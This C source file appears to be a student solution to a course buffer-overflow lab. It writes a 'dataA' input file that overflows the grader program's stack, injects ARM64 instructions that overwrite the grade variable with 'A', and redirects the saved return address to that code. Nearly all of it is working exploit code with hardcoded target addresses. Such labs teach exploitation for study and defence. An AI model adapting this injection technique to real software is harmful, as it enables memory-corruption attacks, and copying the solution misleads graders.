/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* author: anish k                                                     */
/*--------------------------------------------------------------------*/

/*
   this code constructs a "dataA" file that is carefully engineered to
   trick the grader program into displaying 'A' as the final grade. it
   accomplishes this by overflowing a buffer to inject instructions that
   overwrite the 'grade' variable with 'A', and then branching back into
   the code that prints the grade normally.

   steps at a glance:
   - write a chosen username and end it with a null terminator, ensuring
     correct string format.
   - insert a sequence of null bytes to surpass normal stack boundaries,
     positioning the return address for overwrite.
   - produce and embed instructions that load 'A' into the w0 register,
     locate the 'grade' variable via adr, store 'A' at that memory
     location, and then jump to the routine that prints the grade.
   - overwrite the saved return address so that, instead of returning as
     usual, the program executes our injected instructions, ultimately
     displaying 'A' as the grade.
*/

/*
   runtime details:
   - no command-line arguments are handled.
   - no data is read from standard input or any other stream.
   - output is directed solely into a file named "dataA".
   - returns 0 on success, and 1 if the file cannot be opened or written.
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* key constants derived from offline analysis of the grader binary.
   these addresses and offsets ensure that our payload lands at the
   right spots in memory. modifying these without analysis could
   break the intended behavior. */
enum {
    NAME_SIZE         = 9,        /* length of "AnishKKat" not counting '\0' */
    NUM_PADDING       = 22,       /* count of null bytes to push beyond frame */
    ASCII_A           = 0x41,     /* 'A' character code */
    ADDR_GRADE_VAR    = 0x420044, /* address of the 'grade' variable in memory */
    ADDR_PRINT_CODE   = 0x40089c, /* address where grade is printed */
    ADDR_RET_INJECTED = 0x420078, /* new return address where our code executes */
    ADDR_REF_ADR      = 0x42007c  /* reference address for adr calculation */
};

int main(void) {
    const char *pszUsername = "AnishKKat";
    FILE *pFileOut;
    unsigned int uiInstrMov;
    unsigned int uiInstrAdr;
    unsigned int uiInstrStrb;
    unsigned int uiInstrBranch;
    unsigned long ulNewRetAddr;
    int iCount;
    char cNullByte;
    unsigned int uiInstructionBlock[4];

    /* open the output file "dataA" in binary mode to prevent any 
       unintended data transformations. if it fails, print an error and 
       return immediately. */
    pFileOut = fopen("dataA", "wb");
    if (pFileOut == NULL) {
        fprintf(stderr, "error: cannot open dataA for writing.\n");
        return 1;
    }

    /* use a single-character variable for the null byte, which we will 
       reuse multiple times, keeping code simple and consistent. */
    cNullByte = '\0';

    /* write the user name followed by a null terminator. this ensures 
       that the grader reads a proper string. */
    fwrite(pszUsername, 1, NAME_SIZE, pFileOut);
    fputc(cNullByte, pFileOut);

    /* insert null bytes as padding to overflow the stack frame. by 
       carefully choosing the number of padding bytes (NUM_PADDING), we 
       align our injected instructions so that they will be executed 
       as intended. */
    iCount = 0;
    while (iCount < NUM_PADDING) {
        fputc(cNullByte, pFileOut);
        iCount++;
    }

    /*
       now we generate and embed the machine instructions that will be 
       executed at runtime once our return address is overwritten:
       
       1) mov w0, 'A':
          place 'A' into w0 so we have the character ready for storage.
       
       2) adr x1, ADDR_GRADE_VAR:
          compute the address of the 'grade' variable and store it in x1.
          this gives us a direct pointer to the target memory location.
       
       3) strb w0, [x1]:
          store the 'A' character into the grade variable, effectively 
          changing what was previously 'D' into 'A'.
       
       4) b ADDR_PRINT_CODE:
          branch to the existing code that prints the grade, making it
          appear as if the program naturally decided to give 'A' as the 
          final grade.
    */
    uiInstrMov   = MiniAssembler_mov(0, ASCII_A);
    uiInstrAdr   = MiniAssembler_adr(1, ADDR_GRADE_VAR, ADDR_REF_ADR);
    uiInstrStrb  = MiniAssembler_strb(0, 1);
    uiInstrBranch= MiniAssembler_b(ADDR_PRINT_CODE, ADDR_REF_ADR + 8);

    /* store all instructions in an array before writing them out. this 
       slightly restructures how we write them, making it clear that we 
       have a coherent block of instructions. */
    uiInstructionBlock[0] = uiInstrMov;
    uiInstructionBlock[1] = uiInstrAdr;
    uiInstructionBlock[2] = uiInstrStrb;
    uiInstructionBlock[3] = uiInstrBranch;

    /* write the entire instruction block to the file in one go. having 
       them together helps visualize the code injection as a single unit. */
    fwrite(uiInstructionBlock, sizeof(unsigned int), 4, pFileOut);

    /* finally, overwrite the saved return address with ADDR_RET_INJECTED.
       when the function returns, it will jump into our injected 
       instructions instead of returning normally. */
    ulNewRetAddr = ADDR_RET_INJECTED;
    fwrite(&ulNewRetAddr, sizeof(unsigned long), 1, pFileOut);

    /* close the file to ensure data integrity before program termination. */
    fclose(pFileOut);
    return 0;
}